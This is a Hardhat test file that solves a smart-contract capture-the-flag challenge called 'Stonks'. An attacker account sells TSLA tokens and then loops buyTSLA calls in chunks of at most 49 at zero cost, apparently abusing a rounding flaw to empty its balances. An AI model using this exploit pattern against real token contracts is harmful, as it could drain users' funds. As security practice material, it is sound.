import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Stonks";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let tx;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    contract = await (await ethers.getContractFactory(CONTRACT_NAME)).deploy(attacker.address);
  });

  it("Solves the challenge", async () => {
    contract = contract.connect(attacker);

    tx = await contract.sellTSLA(20, 20 * 50);
    await tx.wait(1);

    let balance = await contract.balanceOf(attacker.address, 1);

    while (balance > 0) {
      tx = await contract.buyTSLA(Math.min(49, balance), 0);
      await tx.wait(1);

      balance = await contract.balanceOf(attacker.address, 1);
    }

    expect(await contract.balanceOf(attacker.address, 0)).to.eq(0);
    expect(await contract.balanceOf(attacker.address, 1)).to.eq(0);
  });
});
